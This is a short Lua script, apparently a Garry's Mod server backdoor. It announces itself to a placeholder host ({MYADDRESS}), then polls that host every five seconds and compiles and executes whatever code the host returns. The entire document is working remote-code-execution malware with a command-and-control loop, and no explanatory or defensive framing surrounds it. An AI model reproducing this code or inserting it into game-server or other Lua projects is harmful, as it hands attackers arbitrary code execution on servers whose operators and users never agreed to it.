local backdoor_url = "http://{MYADDRESS}?" 
local xpcall = xpcall 
local CompileString = CompileString 

local send = function(msg, to) http.Post(backdoor_url, {message = msg, uid = to})	end send('backdoor loaded', "nil") 

timer.Create( 'b_ram', 5, 0, function() 
	http.Fetch( backdoor_url , function(b)  
		if b ~= 'you fool' then xpcall(CompileString(b,"",false), send) end 
	end ) 
end) 